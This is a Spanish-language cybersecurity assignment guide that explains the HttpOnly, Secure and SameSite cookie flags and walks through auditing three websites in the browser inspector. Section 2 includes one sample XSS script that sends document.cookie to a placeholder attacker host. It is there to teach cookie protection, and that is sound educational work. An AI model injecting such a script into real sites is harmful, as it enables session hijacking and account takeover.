# Objetivo 1: Auditoría de Cookies y Banderas de Seguridad

**Materia:** Ciberseguridad — Tarea de investigación
**Tema:** Banderas de seguridad en cookies de sesión (HttpOnly, Secure, SameSite)

---

## 1. Las banderas de seguridad en cookies de sesión

Antes de auditar, estas son las banderas que se deben buscar en el inspector (pestaña *Application → Cookies* en Chrome/Edge, o *Storage → Cookies* en Firefox):

| Bandera | Qué hace |
| --- | --- |
| **HttpOnly** | La cookie **no es accesible desde JavaScript** (`document.cookie` no la devuelve) |
| **Secure** | La cookie **solo se transmite por HTTPS** (conexiones cifradas) |
| **SameSite** (`Strict` / `Lax` / `None`) | Controla si la cookie se envía en solicitudes desde otros sitios (protege contra CSRF) |
| **Domain / Path** | Delimita el alcance de la cookie |

---

## 2. ¿Qué protege exactamente la bandera HttpOnly?

**HttpOnly protege la cookie de sesión contra el robo mediante Cross-Site Scripting (XSS).**

El mecanismo:

1. Una cookie de sesión sin `HttpOnly` es **accesible desde JavaScript** del navegador. Cualquier script que se ejecute en el contexto de la página puede leerla con una simple línea:

   ```javascript
   document.cookie  // → "PHPSESSID=abc123..."
   ```

2. Si la aplicación tiene una vulnerabilidad XSS (aunque sea mínima: un comentario sin sanitizar, un parámetro reflejado), el atacante inyecta un script que exfiltra la cookie:

   ```javascript
   <script>
     new Image().src = "https://atacante.com/robo?c=" + document.cookie;
   </script>
   ```

3. Con la cookie de sesión en su poder, el atacante puede **secuestrar la sesión** (*session hijacking*): la inserta en su propio navegador y el servidor lo trata como el usuario legítimo, **sin necesidad de conocer usuario ni contraseña**.

**Con `HttpOnly` activada:** cuando el script malicioso intenta leer `document.cookie`, la cookie de sesión **no aparece** — el navegador la envía solo en las peticiones HTTP, pero la oculta del motor de JavaScript. El XSS sigue existiendo, pero su impacto se degrada drásticamente: el atacante ya no puede robar la sesión directamente (aunque podría realizar acciones en nombre del usuario desde la página, lo que refuerza la necesidad de combinarla con `SameSite` y otras defensas).

> **En síntesis:** HttpOnly no previene el XSS, sino que **rompe el eslabón entre XSS y el secuestro de sesión**.

---

## 3. ¿Qué riesgo corre el usuario si la cookie NO tiene la bandera Secure?

La bandera `Secure` obliga a que la cookie viaje **únicamente por conexiones cifradas (HTTPS)**. Sin ella:

1. **Transmisión en texto plano por HTTP.** Si el usuario — o cualquier recurso de la página — dispara una petición por `http://` (un enlace, una redirección, un recurso mixto), la cookie de sesión viaja **sin cifrar**.

2. **Interceptación en la red (sniffing / Man-in-the-Middle).** Cualquiera con acceso al trayecto (WiFi pública, ISP malicioso, punto de acceso falso/evil twin, proxy corporativo comprometido) puede **capturar la cookie con herramientas como Wireshark o tcpdump** y reutilizarla para hacerse pasar por el usuario — sin descifrar nada, porque la cookie viaja tal cual.

3. **Fuga por enlaces externos.** Sin `Secure`, el navegador envía la cookie incluso al seguir un enlace `http://` hacia otro sitio (en algunos escenarios), exponiendo el identificador de sesión a servidores de terceros.

**Consecuencia final:** robo de sesión → suplantación de identidad del usuario → acceso a su cuenta, datos personales y acciones en su nombre (compras, cambios de contraseña, etc.).

---

## 4. Guía de auditoría (para los 3 sitios)

Pasos en el navegador (ejemplo en Chrome):

1. Iniciar sesión (o navegar) en el sitio elegido.
2. Abrir el inspector: **F12 → Application → Cookies → [dominio]**.
3. Localizar la cookie de sesión (nombres típicos: `PHPSESSID`, `JSESSIONID`, `sessionid`, `.ASPXAUTH`, `connect.sid`).
4. Verificar las columnas **HttpOnly**, **Secure** y **SameSite**.
5. Repetir con los otros dos sitios y completar la tabla:

| Sitio | Cookie de sesión | HttpOnly | Secure | SameSite | ¿Correcto? |
| --- | --- | --- | --- | --- | --- |
| Sitio 1 | | ☐ Sí / ☐ No | ☐ Sí / ☐ No | | |
| Sitio 2 | | ☐ Sí / ☐ No | ☐ Sí / ☐ No | | |
| Sitio 3 | | ☐ Sí / ☐ No | ☐ Sí / ☐ No | | |

**Criterio de evaluación:** una cookie de sesión correctamente protegida debe tener **las tres banderas**: `HttpOnly` + `Secure` + `SameSite=Lax` o `Strict`.

> **Nota práctica:** los sitios grandes (bancos, Google, Microsoft) casi siempre las implementan bien; los sitios pequeños, foros antiguos o sistemas administrativos suelen fallar en `Secure` o `SameSite`. Si se encuentra una cookie sin banderas, anotar el nombre exacto y el valor de las columnas — es la evidencia para el informe.
